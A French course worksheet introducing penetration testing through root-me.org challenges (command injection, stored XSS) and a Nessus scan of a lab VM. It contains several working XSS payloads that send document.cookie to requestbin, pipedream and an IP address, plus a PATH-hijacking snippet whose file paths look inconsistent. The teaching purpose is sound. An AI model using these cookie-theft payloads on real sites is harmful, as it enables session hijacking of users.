## TD.D3 Introduction au test d'intrusion

**But du TD**

Le but de ce TD est de comprendre le déroulement d'un test d'intrusion.

1. **Rappel éthique, méthodologique et législatif**

2. Challenges root-me.org

   1. Cette première partie utilise le site root-me.org qui propose des challenges en ligne.

   2. Injection de commande

      1. Site : https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande
      2. Comprendre quelle est l'utilité de la page, son fonctionnement.
      3. Détourner la valeur entrée dans le formulaire pour faire exécuter du code côté serveur et afficher le contenu du fichier index.php
      4. Explorer le code source de la page grâce à des outils type firefox ou Burp pour récupérer les informations.
      5. Pour aller plus loin : ne pas se contenter du mot de passe (flag) mais comprendre quel est l'utilisateur connecté, quels sont les droits de celui-ci, les fichiers auxquels il a accès...

      ```bash
      cp /bin/cat /tmp/jiawen
      mv /tmp/jiawen/cat /tmp/jiawen/ls
      export PATH="/tmp/jiawen"
      ```

      

   3. XSS - stockée

      ```javascript
      asdsda<script type="text/javascript">document.write("<img src='http://172.26.147.25:10086?c=" + escape(document.cookie) + "'>")</script>
      
      
      

      <script>document.location='http://requestbin.net/r/wxs0h3wx'%2Bdocument.cookie</script>

      asdasd<script>document.location('https://en14ayibfnoa8.x.pipedream.net'+document.cookie)</script>
      ```
      
      
      
      1. Cet exercice ne fonctionne pas avec Chrome.
      
      2. Site : https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2
      
      3. Utiliser Burp (à configurer) pour intercepter les requêtes HTTP.
      
      4. Injecter la XSS d'abord dans le formulaire pour s'assurer que le site est vulnérable aux XSS.
      
      5. Utiliser un requestbin pour simuler un serveur web.
      
      6. Injecter la XSS dans le cookie : status=invite"><script>document.location='http://requestbin.net/r/tmqt8xtm'%2Bdocument.cookie</script> pour envoyer le cookie admin vers votre serveur requestbin
      
      7. Utiliser requestbin pour récupérer le cookie admin de la XSS (cela peut prendre plusieurs minutes).
      
      8. Créer une nouvelle requête vers root-me en injectant le cookie récupéré juste avant pour avoir accès au mot de passe (flag) [Cookie: status=admin ADMIN_COOKIE=XXXXXX] OU réinjecter le cookie dans le navigateur utilisé.
      
         %2B -> +
      
         %22 -> "

3. Nessus

   1. Expliquer la portée de l'outil, ses limitations et les précautions à prendre pour son utilisation.
   2. Sur la machine debian fournie (root/toor) et importée grâce à l'OVA "VM_NESSUS", lancer https://127.0.0.1:8834 pour lancer Nessus en local.
   3. Se connecter avec admin/admin.
   4. Lancer un scan "new scan - advanced scan" sur l'IP de la machine cible.
   5. Attendre 7/8 minutes puis parcourir le rapport .


**Remarques**

- S'assurer que votre VM_NESSUS et votre VM_VULNERABLE ont toutes les deux des interfaces réseaux montées et actives (@IP sur chaque).
- Ne jamais monter une VM vulnérable en NAT.





```html
"><script>document.write(%22<img src=http://requestbin.net/r/tmqt8xtm?%22.concat(document.cookie).concat(%22 />%22))</script>

document.write("<img src=http://requestbin.net/r/tmqt8xtm?"+document.cookie+"/>")

"><script>document.write("<img src=http://requestbin.net/r/tmqt8xtm?tk=".concat(document.cookie).concat("/>"))</script>
```

```javascript
document.write("<img src=http://requestbin.fullcontact.com/qnwgrmqn?tk="+document.cookie+"/>")



http://requestbin.net/r/1o3hq001

"><script>document.write("<img src=http://requestbin.net/r/143azfp1?tk=".concat(document.cookie.replace(%22 %22,%22&%22)).concat("/>"))</script>; uid=wKgbZF36Ws5I+U3ID2nRAg==



http://requestbin.net/r/143azfp1
```



